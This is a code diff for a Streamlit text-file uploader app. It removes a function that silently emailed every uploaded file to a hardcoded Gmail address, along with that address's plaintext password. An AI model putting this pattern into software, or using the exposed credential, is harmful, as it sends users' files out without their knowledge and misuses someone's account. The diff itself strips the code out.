@@ -77,34 +77,6 @@ def clean_text(text):
     # Return the cleaned text
     return text
 
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.application import MIMEApplication
-
-# Define the email addresses and credentials
-sender_email = "samngere1@gmail.com"
-receiver_email = "samngere1@gmail.com"
-password = "samngere123!!"
-
-def send_email(file_name, file_data):
-    # Define the message
-    message = MIMEMultipart()
-    message["From"] = sender_email
-    message["To"] = receiver_email
-    message["Subject"] = "Uploaded file from Streamlit app"
-
-    # Add the file as an attachment to the message
-    file = MIMEApplication(file_data, name=file_name)
-    file['Content-Disposition'] = f'attachment; filename="{file_name}"'
-    message.attach(file)
-
-    # Send the message using SMTP
-    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
-        server.login(sender_email, password)
-        server.sendmail(sender_email, receiver_email, message.as_string())
-
-
 # Define the Streamlit app
 def app():
     st.title("Text File Uploader")
@@ -117,8 +89,6 @@ def app():
     if file is not None:
         text = file.read().decode('utf-8')
         cleaned_text = clean_text(text)
-        send_email(file.name, file.read())      
-        
         
 # Run the app
 if __name__ == '__main__':
